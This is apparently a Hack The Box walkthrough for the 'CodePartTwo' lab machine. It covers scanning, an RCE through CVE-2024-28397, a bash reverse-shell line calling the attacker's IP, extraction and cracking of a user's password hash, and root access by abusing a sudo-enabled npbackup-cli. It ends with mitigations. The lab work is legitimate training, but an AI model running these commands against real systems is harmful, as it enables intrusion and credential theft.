# CodePartTwo — HTB Walkthrough

**Status:** Completed  
**Difficulty:** Easy  
**OS:** Linux

## TL;DR
Discover web application with source code download, identify CVE-2024-28397 vulnerability, exploit to gain reverse shell, extract database credentials, crack hash, SSH as user, exploit sudo npbackup-cli for root flag.

## Target / Access
**Target IP:** `10.10.11.82`  
**Attacker IP:** `10.10.14.120`

---

## Enumeration

### Step 1: Port Scanning with Nmap

**Command:**
```bash
nmap -sC -sV -p- 10.10.11.82
```

**Raw Log:** [nmap.txt](nmap.txt)

**Output Excerpt:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
8000/tcp open  http    Python/Flask application
```

**Analysis:** SSH and web application running on port 8000.

![Nmap scan results](nmap.png)

### Step 2: Web Application Reconnaissance

**Action:** Add target to /etc/hosts and browse to web application

**Command:**
```bash
echo "10.10.11.82 codeparttwo.htb" >> /etc/hosts
```

**Analysis:** Web application allows source code download.

![Web application](codePartTwo.png)

### Step 3: Directory Enumeration with Dirsearch

**Command:**
```bash
dirsearch -u http://codeparttwo.htb:8000
```

**Raw Log:** [dirsearch.txt](dirsearch.txt)

**Analysis:** Discovered endpoints and downloadable source code.

![Dirsearch results](dirsearch.png)

### Step 4: Vulnerability Scanning with Nuclei

**Command:**
```bash
nuclei -u http://codeparttwo.htb:8000
```

**Raw Log:** [nuclei.txt](nuclei.txt)

**Analysis:** No critical findings from automated scan.

![Nuclei scan](nuclei.png)

### Step 5: Source Code Analysis

**Action:** Download and analyze application source code

**Analysis:** Application tree revealed potential vulnerability points.

![Application tree structure](app_tree.png)

**Finding:** Application vulnerable to **CVE-2024-28397**.

![CVE research](cve.png)

![CVE verification](cve_is_ok.png)

---

## Foothold / Initial Access

### Step 6: CVE-2024-28397 Exploitation

**Vulnerability:** Remote Code Execution via CVE-2024-28397

**Command:**
```bash
# Set up listener
nc -lvnp 4444

# Exploit with reverse shell payload
# Modified command: bash -c 'bash -i >& /dev/tcp/10.10.14.120/4444 0>&1'
```

**Raw Log:** [exploit-output.txt](instruction.txt) (Step 5)

**Output:** Reverse shell obtained.

![Exploit execution](exploit.png)

### Step 7: Database Credential Extraction

**Commands:**
```bash
# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Locate and read users.db
cat /path/to/users.db
```

**Analysis:** Found hash for user `marco`.

**Hash Found:** `649c9d65a206a75f5abe509fe128bce5`

![Marco's hash in database](marco_hash.png)

### Step 8: Password Cracking

**Command:**
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Password successfully cracked: `iambatman`

![Password cracking](marco_pass.png)

### Step 9: SSH Access and User Flag

**Command:**
```bash
ssh marco@10.10.11.82
cat ~/user.txt
```

**Output:** User flag captured.

![User flag](user_flag.png)

---

## Privilege Escalation

### Step 10: Sudo Privilege Enumeration

**Command:**
```bash
sudo -l
```

**Output:**
```
User marco may run the following commands:
    (root) NOPASSWD: /usr/local/bin/npbackup-cli
```

**Analysis:** Can run npbackup-cli as root without password.

### Step 11: NPBackup Configuration Exploitation

**Commands:**
```bash
# Copy existing config file
cp /path/to/config.conf ./test.conf

# Modify configuration to backup /root directory
nano ./test.conf

# Create backup
sudo /usr/local/bin/npbackup-cli -c ./test.conf -b

# List snapshots
sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshots
```

**Analysis:** Created backup of root directory using modified config.

![Configuration modification](gnu_root.png)

### Step 12: Root Flag Extraction via Snapshot

**Commands:**
```bash
# List snapshot contents
sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id <snapshot-id> --ls

# Dump root flag
sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id <snapshot-id> --dump /root/root.txt
```

**Output:** Root flag successfully extracted from backup snapshot.

![Snapshot contents and flag extraction](snapshot.png)

---

## Summary

This machine involved exploiting a known CVE, database credential extraction, and privilege escalation via backup software.

### Attack Chain
1. **Nmap Scan** — Discovered web application on port 8000
2. **Source Code Analysis** — Identified CVE-2024-28397 vulnerability
3. **RCE Exploitation** — Gained reverse shell via CVE exploit
4. **Credential Extraction** — Retrieved hash from users.db
5. **Password Cracking** — Cracked marco's password with hashcat
6. **SSH Access** — Authenticated as marco, captured user flag
7. **Privilege Escalation** — Exploited sudo npbackup-cli to backup root directory
8. **Root Flag** — Extracted root flag from backup snapshot

### Tools Used
- Nmap — Port scanning and service detection
- Dirsearch — Directory enumeration
- Nuclei — Vulnerability scanning
- Hashcat — Password cracking
- Netcat — Reverse shell listener
- npbackup-cli — Backup software exploited for privilege escalation

---

## Cleanup / Notes / References

### Mitigation Recommendations
1. **Patch Vulnerabilities:** Update application to patch CVE-2024-28397.
2. **Input Validation:** Implement strict input validation and sanitization.
3. **Database Security:** Encrypt sensitive data, use strong password hashing (bcrypt, Argon2).
4. **Sudo Restrictions:** Limit sudo privileges, avoid wildcards and unrestricted binary access.
5. **Backup Security:** Restrict backup tool access, validate configuration files.
6. **Principle of Least Privilege:** Grant minimal necessary permissions.

### References
- [CVE-2024-28397 Details](https://nvd.nist.gov/)
- [OWASP: SQL Injection Prevention](https://cheatsheetseries.owasp.org/)
- [Linux Privilege Escalation Techniques](https://book.hacktricks.xyz/)


